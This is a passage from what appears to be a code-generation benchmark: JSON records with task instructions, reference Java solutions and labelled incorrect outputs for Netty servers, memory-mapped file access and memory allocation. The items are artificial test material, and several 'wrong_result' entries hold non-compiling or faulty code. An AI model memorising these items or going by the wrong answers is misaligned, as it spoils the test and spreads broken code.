    "wrong_result": "serverBootstrap = new ServerBootstrap();\nbossGroup = new NioEventLoopGroup();\nworkerGroup = new NioEventLoopGroup();\nthis.port = port;\n\npublic NettyTcpServer(int port) {\n    serverBootstrap.group(bossGroup, workerGroup)\n                   .channel(NioServerSocketChannel.class)\n                   .childHandler(new ChannelInitializer<SocketChannel>() {\n                       @Override\n                       protected void initChannel(SocketChannel ch) {\n                           ch.pipeline().addLast(new NettyServerHandler());\n                       }\n                   });\n}\n\npublic void start() throws Exception {\n    ChannelFuture future = serverBootstrap.bind(port).sync();\n    future.channel().closeFuture().sync();\n}\n\npublic void shutdown() {\n    bossGroup.shutdownGracefully();\n    workerGroup.shutdownGracefully();\n}\n\nprivate class NettyServerHandler extends ChannelInboundHandlerAdapter {\n    @Override\n    public void channelRead(ChannelHandlerContext ctx, Object msg) {\n        ByteBuf in = (ByteBuf) msg;\n        try {\n            System.out.println(\"Received: \" + in.toString(CharsetUtil.UTF_8));\n            ctx.write(in);\n        } finally {\n            in.release();\n        }\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}"
  },
  {
    "Task_id": 198,
    "Instruction": "Task Description: Implement a Netty-based TCP server acceptor class that handles MQTT protocol communication, including server initialization, configuration, and graceful shutdown.\n\nClass Description: NettyAcceptor is a server acceptor implementation that uses Netty framework to create a TCP server for MQTT protocol communication. It manages server resources, handles incoming connections, and processes MQTT messages through configured handlers.\n\nAttributes:\n- m_bossGroup: [NioEventLoopGroup] - The parent event loop group that accepts incoming connections\n- m_workerGroup: [NioEventLoopGroup] - The child event loop group that handles the traffic of accepted connections\n- channelClass: [Class<? extends ServerSocketChannel>] - The channel class implementation (NIO in this case)\n- nettySoBacklog: [int] - Maximum queue length for incoming connection indications\n- nettySoReuseaddr: [boolean] - Whether to reuse local address and port\n- nettyTcpNodelay: [boolean] - Whether to enable TCP_NODELAY (disable Nagle's algorithm)\n- nettySoKeepalive: [boolean] - Whether to enable SO_KEEPALIVE\n- nettyChannelTimeoutSeconds: [int] - Channel idle timeout in seconds\n\nMethods:\n- initialize([ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator]) -> [void] - Initializes the acceptor with MQTT processor, configuration properties, and SSL context creator\n- initializePlainTCPTransport([NettyMQTTHandler handler, IConfig props]) -> [void] - Configures and starts the plain TCP transport with MQTT-specific handlers\n- close() -> [void] - Shuts down the acceptor gracefully, releasing all resources",
    "Canonical_solution": "import io.moquette.server.ServerAcceptor;\nimport io.moquette.server.config.IConfig;\nimport io.moquette.spi.impl.ProtocolProcessor;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.mqtt.MqttDecoder;\nimport io.netty.handler.codec.mqtt.MqttEncoder;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.Future;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyAcceptor implements ServerAcceptor {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyAcceptor.class);\n\n    private EventLoopGroup m_bossGroup;\n    private EventLoopGroup m_workerGroup;\n    private Class<? extends ServerSocketChannel> channelClass;\n    private int nettySoBacklog;\n    private boolean nettySoReuseaddr;\n    private boolean nettyTcpNodelay;\n    private boolean nettySoKeepalive;\n    private int nettyChannelTimeoutSeconds;\n\n    @Override\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) throws IOException {\n        LOG.info(\"Initializing Netty acceptor...\");\n\n        nettySoBacklog = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_SO_BACKLOG_PROPERTY_NAME, \"128\"));\n        nettySoReuseaddr = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_REUSEADDR_PROPERTY_NAME, \"true\"));\n        nettyTcpNodelay = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_TCP_NODELAY_PROPERTY_NAME, \"true\"));\n        nettySoKeepalive = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_KEEPALIVE_PROPERTY_NAME, \"true\"));\n        nettyChannelTimeoutSeconds = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_CHANNEL_TIMEOUT_SECONDS_PROPERTY_NAME, \"10\"));\n\n        LOG.info(\"Netty is using NIO\");\n        m_bossGroup = new NioEventLoopGroup(1);\n        m_workerGroup = new NioEventLoopGroup();\n        channelClass = NioServerSocketChannel.class;\n\n        final NettyMQTTHandler mqttHandler = new NettyMQTTHandler(processor);\n        initializePlainTCPTransport(mqttHandler, props);\n    }\n\n    private void initializePlainTCPTransport(final NettyMQTTHandler handler, IConfig props) throws IOException {\n        LOG.info(\"Configuring TCP MQTT transport\");\n        final MoquetteIdleTimeoutHandler timeoutHandler = new MoquetteIdleTimeoutHandler();\n        String host = props.getProperty(BrokerConstants.HOST_PROPERTY_NAME, \"0.0.0.0\");\n        String tcpPortProp = props.getProperty(PORT_PROPERTY_NAME, DISABLED_PORT_BIND);\n        if (DISABLED_PORT_BIND.equals(tcpPortProp)) {\n            LOG.info(\"TCP MQTT will be disabled\");\n            return;\n        }\n        int port = Integer.parseInt(tcpPortProp);\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(m_bossGroup, m_workerGroup)\n            .channel(channelClass)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addFirst(\"idleStateHandler\", new IdleStateHandler(nettyChannelTimeoutSeconds, 0, 0));\n                    pipeline.addAfter(\"idleStateHandler\", \"idleEventHandler\", timeoutHandler);\n                    pipeline.addLast(\"decoder\", new MqttDecoder());\n                    pipeline.addLast(\"encoder\", MqttEncoder.INSTANCE);\n                    pipeline.addLast(\"handler\", handler);\n                }\n            })\n            .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n            .option(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n            .childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n            .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive);\n\n        try {\n            LOG.info(\"Binding server. host={}, port={}\", host, port);\n            ChannelFuture f = b.bind(host, port);\n            LOG.info(\"Server has been bound. host={}, port={}\", host, port);\n            f.sync();\n        } catch (InterruptedException ex) {\n            LOG.error(\"An interruptedException was caught while initializing server\", ex);\n        }\n    }\n\n    public void close() {\n        LOG.info(\"Closing Netty acceptor...\");\n        if (m_workerGroup == null || m_bossGroup == null) {\n            throw new IllegalStateException(\"Invoked close on an Acceptor that wasn't initialized\");\n        }\n        Future<?> workerWaiter = m_workerGroup.shutdownGracefully();\n        Future<?> bossWaiter = m_bossGroup.shutdownGracefully();\n\n        try {\n            workerWaiter.await(10, TimeUnit.SECONDS);\n            bossWaiter.await(10, TimeUnit.SECONDS);\n        } catch (InterruptedException iex) {\n            LOG.warn(\"An InterruptedException was caught while waiting for event loops to terminate...\");\n        }\n\n        if (!m_workerGroup.isTerminated()) {\n            m_workerGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n\n        if (!m_bossGroup.isTerminated()) {\n            m_bossGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.HashedWheelTimer;\nimport io.netty.util.Timer;\n\npublic class NettyAcceptor {\n    private EventLoopGroup m_bossGroup;\n    private EventLoopGroup m_workerGroup;\n    private Class<? extends ServerSocketChannel> channelClass = NioServerSocketChannel.class;\n    private int nettySoBacklog = 1024;\n    private boolean nettySoReuseaddr = true;\n    private boolean nettyTcpNodelay = true;\n    private boolean nettySoKeepalive = true;\n    private int nettyChannelTimeoutSeconds = 60;\n\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) {\n        m_bossGroup = new NioEventLoopGroup();\n        m_workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(m_bossGroup, m_workerGroup)\n             .channel(channelClass)\n             .option(io.netty.channel.ChannelOption.SO_BACKLOG, nettySoBacklog)\n             .option(io.netty.channel.ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n             .option(io.netty.channel.ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n             .option(io.netty.channel.ChannelOption.SO_KEEPALIVE, nettySoKeepalive)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new IdleStateHandler(nettyChannelTimeoutSeconds, 0, 0));\n                     if (sslCtxCreator != null && sslCtxCreator.isSslEnabled()) {\n                         ch.pipeline().addLast(sslCtxCreator.createSslContext().newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new NettyMQTTHandler(processor));\n                 }\n             });\n            ChannelFuture f = b.bind(props.getPort()).sync();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            close();\n        }\n    }\n\n    public void initializePlainTCPTransport(NettyMQTTHandler handler, IConfig props) {\n        m_bossGroup = new NioEventLoopGroup();\n        m_workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(m_bossGroup, m_workerGroup)\n             .channel(channelClass)\n             .option(io.netty.channel.ChannelOption.SO_BACKLOG, nettySoBacklog)\n             .option(io.netty.channel.ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n             .option(io.netty.channel.ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n             .option(io.netty.channel.ChannelOption.SO_KEEPALIVE, nettySoKeepalive)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new IdleStateHandler(nettyChannelTimeoutSeconds, 0, 0));\n                     ch.pipeline().addLast(handler);\n                 }\n             });\n            ChannelFuture f = b.bind(props.getPort()).sync();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            close();\n        }\n    }\n\n    public void close() {\n        if (m_bossGroup != null) {\n            m_bossGroup.shutdownGracefully();\n        }\n        if (m_workerGroup != null) {\n            m_workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Java class that provides memory-mapped file access capabilities and process spawning functionality for inter-process communication scenarios.\n\nClass Description: FileChannelInteractor is a utility class that handles memory-mapped file operations and process management. It allows read-only memory mapping of files and provides functionality to spawn worker processes for IPC scenarios.\n\nAttributes:\n- fileChannel: FileChannel - The NIO FileChannel used for file operations\n- mapAddress: long - The memory address of the mapped file region\n- fileSize: long - The size of the mapped file in bytes\n\nMethods:\n- FileChannelInteractor(String filePath) -> void - Constructor that opens a file channel and maps the file into memory in read-only mode\n- getMemoryMappedAddress() -> long - Returns the memory address of the mapped file region\n- getFileSize() -> long - Returns the size of the mapped file\n- close() -> void - Closes the file channel and releases system resources\n- spawnWorkerProcess() -> void - Static method that spawns a worker process with the same command and arguments as the current process, adding a \"--worker\" flag",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelInteractor {\n\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mapAddress = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        fileChannel.close();\n    }\n\n    public static void spawnWorkerProcess() throws IOException {\n        ProcessHandle.Info info = ProcessHandle.current().info();\n        ArrayList<String> workerCommand = new ArrayList<>();\n        info.command().ifPresent(workerCommand::add);\n        info.arguments().ifPresent(args -> workerCommand.addAll(Arrays.asList(args)));\n        workerCommand.add(\"--worker\");\n        new ProcessBuilder()\n                .command(workerCommand)\n                .inheritIO()\n                .redirectOutput(ProcessBuilder.Redirect.PIPE)\n                .start()\n                .getInputStream()\n                .transferTo(System.out);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws Exception {\n        fileChannel = FileChannel.open(Paths.get(filePath), StandardOpenOption.READ);\n        fileSize = fileChannel.size();\n        mapAddress = ((FileChannelImpl) fileChannel).map(MapMode.READ_ONLY, 0, fileSize).address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws Exception {\n        fileChannel.close();\n    }\n\n    public static void spawnWorkerProcess() {\n        String[] cmd = new String[]{System.getProperty(\"java.home\") + \"/bin/java\", \"-cp\", System.getProperty(\"java.class.path\"), System.getProperty(\"sun.java.command\"), \"--worker\"};\n        try {\n            ProcessBuilder pb = new ProcessBuilder(cmd);\n            pb.inheritIO();\n            pb.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 201,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle multiple client connections and manage them through a channel group.\n\nClass Description: The ChatServer class is a Netty-based TCP server that manages client connections through channel groups. It provides methods to start the server on a specified address and properly shut it down while releasing all resources.\n\nAttributes:\n- channelGroup: [ChannelGroup] - Maintains all active client channels for group operations\n- bossGroup: [EventLoopGroup] - Handles incoming connection requests\n- workGroup: [EventLoopGroup] - Handles I/O operations for established connections\n- channel: [Channel] - Represents the server's listening channel\n\nMethods:\n- start: [Name]([InetSocketAddress address]) -> [ChannelFuture] - Starts the server on the specified address, configures server options, and initializes the channel pipeline with handlers\n- destroy: [Name]() -> [void] - Properly shuts down the server by closing all channels and releasing thread resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.ImmediateEventExecutor;\n\npublic class ChatServer {\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(ImmediateEventExecutor.INSTANCE);\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n    \n    public ChannelFuture start(InetSocketAddress address) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChatServerInitializer(channelGroup))\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n        \n        ChannelFuture future = bootstrap.bind(address).syncUninterruptibly();\n        channel = future.channel();\n        return future;\n    }\n    \n    public void destroy() {\n        if(channel != null) {\n            channel.close();\n        }\n        \n        channelGroup.close();\n        workGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\nbossGroup = new NioEventLoopGroup();\nworkGroup = new NioEventLoopGroup();\nchannel = null;\n\npublic ChannelFuture start(InetSocketAddress address) {\n    ServerBootstrap b = new ServerBootstrap();\n    b.group(bossGroup, workGroup)\n     .channel(NioServerSocketChannel.class)\n     .childHandler(new ChannelInitializer<SocketChannel>() {\n         @Override\n         public void initChannel(SocketChannel ch) {\n             ch.pipeline().addLast(new StringDecoder(), new StringEncoder(), new ChatServerHandler(channelGroup));\n         }\n     })\n     .option(ChannelOption.SO_BACKLOG, 128)\n     .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n    channel = b.bind(address).syncUninterruptibly();\n    return channel;\n}\n\npublic void destroy() {\n    if (channel != null) {\n        channel.close();\n    }\n    channelGroup.close().syncUninterruptibly();\n    bossGroup.shutdownGracefully();\n    workGroup.shutdownGracefully();\n}"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a class that provides anonymous memory allocation capabilities using memory-mapped files, with a fallback to direct byte buffers if memory-mapped files cannot be unlinked.\n\nClass Description: The `AnonAllocator` class is designed to allocate anonymous memory blocks that are not backed by visible files in the filesystem. It attempts to use memory-mapped files that are immediately unlinked (deleted) from the filesystem while remaining accessible through the mapping. If this technique is not supported by the system, it falls back to using direct byte buffers.\n\nAttributes:\n- MAP_AND_UNLINK_SUPPORTED: boolean - A static final flag indicating whether the system supports memory mapping with immediate file unlinking. This is determined during class initialization by testing the capability.\n\nMethods:\n- allocate(int size) -> ByteBuffer - Allocates an anonymous memory block of the specified size. If memory-mapped files with unlinking are supported, it creates a temporary file, maps it into memory, and immediately deletes the file. Otherwise, it falls back to a direct byte buffer allocation. The method returns the allocated ByteBuffer.\n  - Input: size (int) - The size of the memory block to allocate in bytes.\n  - Output: ByteBuffer - The allocated memory block, either as a memory-mapped buffer or a direct byte buffer.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class AnonAllocator {\n\n    static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        Path p = null;\n        boolean result = false;\n        try {\n            ByteBuffer mapped;\n            p = Files.createTempFile(\"unlink-test\", \".tmp\");\n            FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            chan.write(ByteBuffer.allocate(4*1024));\n            mapped = chan.map(MapMode.READ_WRITE, 0, 4*1024);\n            chan.close();\n            Files.delete(p);\n            result = mapped.get() == 0;\n        } catch (IOException e) {\n            if(p != null) {\n                Path toDelete = p;\n                Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                    try {\n                        Files.deleteIfExists(toDelete);\n                    } catch (IOException e1) {\n                        System.err.println(\"could not delete tempfile \"  + toDelete + \", most likely cause: garbage collector did not free the memory mapping keeping it open ; \" + e1.getMessage());\n                    }\n                }));\n            }\n        }\n        MAP_AND_UNLINK_SUPPORTED = result;\n    }\n\n    public static ByteBuffer allocate(int size) {\n        if(MAP_AND_UNLINK_SUPPORTED) {\n            try {\n                Path p = Files.createTempFile(\"anon-mapping\", \".tmp\");\n                ByteBuffer mapped;\n                FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n                chan.position(size);\n                chan.write(ByteBuffer.allocate(1));\n                mapped = chan.map(MapMode.READ_WRITE, 0, size);\n                chan.close();\n                Files.delete(p);\n                return mapped;\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return ByteBuffer.allocateDirect(size);\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class AnonAllocator {\n    private static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        boolean supported = false;\n        try {\n            Path tempFile = Files.createTempFile(\"anon\", \".tmp\");\n            FileChannel channel = FileChannel.open(tempFile, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            ByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, 1);\n            channel.close();\n            Files.delete(tempFile);\n            supported = true;\n        } catch (IOException e) {\n            supported = false;\n        }\n        MAP_AND_UNLINK_SUPPORTED = supported;\n    }\n\n    public static ByteBuffer allocate(int size) {\n        if (MAP_AND_UNLINK_SUPPORTED) {\n            try {\n                Path tempFile = Files.createTempFile(\"anon\", \".tmp\");\n                FileChannel channel = FileChannel.open(tempFile, StandardOpenOption.READ, StandardOpenOption.WRITE);\n                ByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n                Files.delete(tempFile);\n                return buffer;\n            } catch (IOException e) {\n                return ByteBuffer.allocateDirect(size);\n            }\n        } else {\n            return ByteBuffer.allocateDirect(size);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 213,
    "Instruction": "Task Description: Implement a Netty-based TCP server for handling remote commands with connection management and idle state detection.\n\nClass Description: NettyRemotingServer is a TCP server implementation using Netty framework that handles incoming remote commands, manages client connections, and provides event notification for connection changes. It supports configurable thread pools, connection idle detection, and custom channel event handling.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for server configuration\n- bossSelectorGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerSelectorGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- defaultEventExecutorGroup: DefaultEventExecutorGroup - Thread pool for business logic processing\n- appContext: AppContext - Application context for dependency injection\n- LOGGER: Logger - Logger instance for server operations logging\n\nMethods:\n- NettyRemotingServer(AppContext, RemotingServerConfig) -> void - Constructor with application context and server configuration\n- NettyRemotingServer(RemotingServerConfig, ChannelEventListener) -> void - Constructor with server configuration and channel event listener\n- serverStart() -> void - Starts the Netty server, initializes thread pools and configures server bootstrap\n- serverShutdown() -> void - Shuts down the server gracefully, releasing all resources\n- NettyServerHandler: channelRead0(ChannelHandlerContext, RemotingCommand) -> void - Handles incoming message processing\n- NettyConnectManageHandler: channelRegistered(ChannelHandlerContext) -> void - Logs channel registration events\n- NettyConnectManageHandler: channelUnregistered(ChannelHandlerContext) -> void - Logs channel unregistration events\n- NettyConnectManageHandler: channelActive(ChannelHandlerContext) -> void - Handles new active connections\n- NettyConnectManageHandler: channelInactive(ChannelHandlerContext) -> void - Handles connection close events\n- NettyConnectManageHandler: userEventTriggered(ChannelHandlerContext, Object) -> void - Handles idle state events\n- NettyConnectManageHandler: exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.factory.NamedThreadFactory;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.remoting.*;\nimport com.github.ltsopensource.remoting.common.RemotingHelper;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport com.github.ltsopensource.remoting.protocol.RemotingCommand;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\n\nimport java.net.InetSocketAddress;\n\npublic class NettyRemotingServer extends AbstractRemotingServer {\n\n    public static final Logger LOGGER = AbstractRemotingServer.LOGGER;\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private AppContext appContext;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n        this.appContext = appContext;\n    }\n\n    public NettyRemotingServer(RemotingServerConfig remotingServerConfig, final ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(1, new NamedThreadFactory(\"NettyBossSelectorThread_\"));\n        this.workerSelectorGroup = new NioEventLoopGroup(remotingServerConfig.getServerSelectorThreads(), new NamedThreadFactory(\"NettyServerSelectorThread_\", true));\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        NettyLogger.setNettyLoggerFactory();\n\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(\n                remotingServerConfig.getServerWorkerThreads(),\n                new NamedThreadFactory(\"NettyServerWorkerThread_\")\n        );\n\n        final NettyCodecFactory nettyCodecFactory = new NettyCodecFactory(appContext, getCodec());\n\n        this.serverBootstrap.group(this.bossSelectorGroup, this.workerSelectorGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 65536)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .localAddress(new InetSocketAddress(this.remotingServerConfig.getListenPort()))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                                defaultEventExecutorGroup,\n                                nettyCodecFactory.getEncoder(),\n                                nettyCodecFactory.getDecoder(),\n                                new IdleStateHandler(remotingServerConfig.getReaderIdleTimeSeconds(),\n                                        remotingServerConfig.getWriterIdleTimeSeconds(), remotingServerConfig.getServerChannelMaxIdleTimeSeconds()),\n                                new NettyConnectManageHandler(),\n                                new NettyServerHandler());\n                    }\n                });\n\n        try {\n            this.serverBootstrap.bind().sync();\n        } catch (InterruptedException e) {\n            throw new RemotingException(\"Start Netty server bootstrap error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        this.bossSelectorGroup.shutdownGracefully();\n        this.workerSelectorGroup.shutdownGracefully();\n\n        if (this.defaultEventExecutorGroup != null) {\n            this.defaultEventExecutorGroup.shutdownGracefully();\n        }\n    }\n\n    class NettyServerHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            processMessageReceived(new NettyChannel(ctx), msg);\n        }\n    }\n\n    class NettyConnectManageHandler extends ChannelDuplexHandler {\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelRegistered {}\", remoteAddress);\n            super.channelRegistered(ctx);\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelUnregistered, the channel[{}]\", remoteAddress);\n            super.channelUnregistered(ctx);\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelActive, the channel[{}]\", remoteAddress);\n            super.channelActive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CONNECT, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelInactive, the channel[{}]\", remoteAddress);\n            super.channelInactive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CLOSE, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent event = (IdleStateEvent) evt;\n                com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n                final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n\n                if (event.state().equals(IdleState.ALL_IDLE)) {\n                    LOGGER.warn(\"SERVER: IDLE [{}]\", remoteAddress);\n                    RemotingHelper.closeChannel(channel);\n                }\n\n                if (channelEventListener != null) {\n                    RemotingEventType remotingEventType = RemotingEventType.valueOf(event.state().name());\n                    putRemotingEvent(new RemotingEvent(remotingEventType, remoteAddress, channel));\n                }\n            }\n            ctx.fireUserEventTriggered(evt);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.warn(\"SERVER: exceptionCaught {}\", remoteAddress, cause);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.EXCEPTION, remoteAddress, channel));\n            }\n\n            